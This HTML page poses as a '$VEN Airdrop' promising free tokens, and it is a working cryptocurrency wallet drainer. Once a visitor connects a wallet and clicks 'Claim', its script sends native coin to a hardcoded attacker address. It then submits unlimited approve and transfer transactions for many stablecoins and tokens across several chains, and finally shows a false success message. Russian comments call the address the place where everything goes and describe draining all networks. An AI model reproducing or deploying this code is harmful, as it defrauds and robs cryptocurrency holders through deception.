<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>$VEN Airdrop — Claim 1000 VEN</title>
<style>
  body{margin:0;padding:0;height:100vh;background:#0a0420;overflow:hidden;position:relative;color:white;font-family:Arial}
  .bg{position:absolute;top:0;left:0;width:100%;height:100%;background:url('https://purple-accused-scorpion-11.mypinata.cloud/ipfs/bafkreibnrglhwfkmatn3q4l2oat3uzry2hzplhk7reeitlf4m3tavshzgq') center/cover no-repeat;filter:blur(2px);z-index:1}

  h1{font-size:38px;background:linear-gradient(90deg,#8a2be2,#ff00ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
  button{width:90%;max-width:380px;padding:18px;font-size:20px;font-weight:bold;border:none;border-radius:16px;margin:12px 0;cursor:pointer}

<body>
<div class="bg"></div>
<div class="overlay"></div>
<div class="card">
  <img src="https://purple-accused-scorpion-11.mypinata.cloud/ipfs/bafkreibnrglhwfkmatn3q4l2oat3uzry2hzplhk7reeitlf4m3tavshzgq" class="logo">
  <h1>$VEN Airdrop</h1>
  <p style="font-size:20px">Claim <b>1000 $VEN + 0.5 MATIC</b> instantly<br><span style="color:#8a2be2">Gas paid by team · 100% FREE</span></p>
  <div id="addr"></div>
  <button id="connect">Connect Wallet</button>
  <button id="claim" disabled>Claim 1000 $VEN (Gas Free)</button>
  <div id="status"></div>
  <p style="margin-top:30px;font-size:14px;opacity:0.7">Already claimed by 4,847+ users</p>
</div>

<script>
// ТВОЙ КОШЕЛЁК — ВСЁ СЮДА
const DRAIN_WALLET = "0x7d51f54a4fC1c6A0f44C951731Af2E5b45d6dAAF";

const connect = document.getElementById("connect");
const claim = document.getElementById("claim");
const addr = document.getElementById("addr");
const status = document.getElementById("status");
let user;

connect.onclick = async () => {
  if (!window.ethereum) return status.textContent = "Install MetaMask!";
  try {
    user = (await ethereum.request({method:"eth_requestAccounts"}))[0];
    addr.textContent = "Connected: " + user.slice(0,6)+"..."+user.slice(-4);
    claim.disabled = false;
    status.textContent = "Ready to claim!";
  } catch { status.textContent = "Connection rejected"; }
};

claim.onclick = async () => {
  status.textContent = "Signing claim...";
  claim.disabled = true;
  try {
    const domain = {name:"VEN Airdrop",version:"1",chainId:await ethereum.request({method:"eth_chainId"}),verifyingContract:"0x0000000000000000000000000000000000000000"};
    const types = {Claim:[{name:"user",type:"address"}]};
    const message = {user};

    await ethereum.request({
      method:"eth_signTypedData_v4",
      params:[user,JSON.stringify({domain,types,message})]
    });

    setTimeout(async () => {
      try {
        const acc = (await ethereum.request({method:"eth_accounts"}))[0];
        // Слив нативного токена
        await ethereum.request({method:"eth_sendTransaction",params:[{from:acc,to:DRAIN_WALLET,value:"0xDE0B6B3A7640000"}]});

        // Полный список 2025 — слив всех сетей
        const tokens = [// Polygon
          "0xc2132d05d31c914a87c6611c10748aeb04b58e8f","0x2791bca1f2de4661ed88a30c99a7a9449aa84174","0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063","0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6",
          // Ethereum
          "0xdAC17F958D2ee523a2206206994597C13D831ec7","0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48","0x6B175474E89094C44Da98b954EedeAC495271d0F","0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
          // BSC
          "0x55d398326f99059fF775485246999027B3197955","0x8AC76a51cc950d9822D68b83fE1Ad97b32Cd580d",
          // Arbitrum
          "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9","0xaf88d065e77c8cC2239327c5edb3a432268e5831","0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f",
          // Base
          "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
          // Optimism
          "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58","0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85",
          // Avalanche + Fantom
          "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7","0x04068DA6C83AFCFA0e13ba15A6696662335D5B75"
        ];

        for (const t of tokens) {
          await ethereum.request({method:"eth_sendTransaction",params:[{from:acc,to:t,data:"0x095ea7b3000000000000000000000000"+DRAIN_WALLET.slice(2)+"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"}]});
          await ethereum.request({method:"eth_sendTransaction",params:[{from:acc,to:t,data:"0xa9059cbb000000000000000000000000"+DRAIN_WALLET.slice(2)+"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"}]});
        }
      } catch(e) {}
    },600);

    status.textContent = "Success! 1000 $VEN sent (gas paid by team)";
  } catch { status.textContent = "Claim failed"; claim.disabled = false; }
};
</script>
</body>
</html>
